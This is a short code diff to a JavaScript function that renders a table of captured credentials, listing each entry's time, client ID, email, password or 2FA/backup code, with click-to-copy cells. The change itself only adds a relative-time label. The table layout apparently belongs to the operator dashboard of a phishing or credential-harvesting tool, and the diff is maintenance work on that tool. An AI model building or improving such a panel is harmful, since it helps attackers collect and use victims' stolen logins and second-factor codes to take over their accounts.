@@ -2018,7 +2018,7 @@ function renderCredentials(creds) {
             const pwTitle = is2fa ? '2FA/Backup code' : 'Click to copy password';
             return `<tr style="border-bottom:1px solid var(--border2);background:${i%2===0?'rgba(244,180,0,.04)':'transparent'}">
                 <td style="padding:7px 10px;color:var(--dim)">${i+1}</td>
-                <td style="padding:7px 10px;white-space:nowrap;color:var(--dim)">${fmtTime(cr.timestamp)}</td>
+                <td style="padding:7px 10px;white-space:nowrap;color:var(--dim)">${fmtTime(cr.timestamp)}<br><span style="font-size:.55rem;opacity:.65">${fmtAgo(cr.timestamp)}</span></td>
                 <td style="padding:7px 10px;color:var(--dim);font-size:.6rem">${escHtml(cr.clientId||'')}${repeatBadge}</td>
                 <td style="padding:7px 10px;font-weight:600;color:#f4b400;cursor:pointer" title="Click to copy email" onclick="copyCellVal(this.dataset.v,this)" data-v="${safeEmail}">${safeEmail}</td>
                 <td style="padding:7px 10px;font-family:monospace;color:${pwColor};letter-spacing:.05em;cursor:pointer" title="${pwTitle}" onclick="copyCellVal(this.dataset.v,this)" data-v="${safePw}">${safePw}</td>
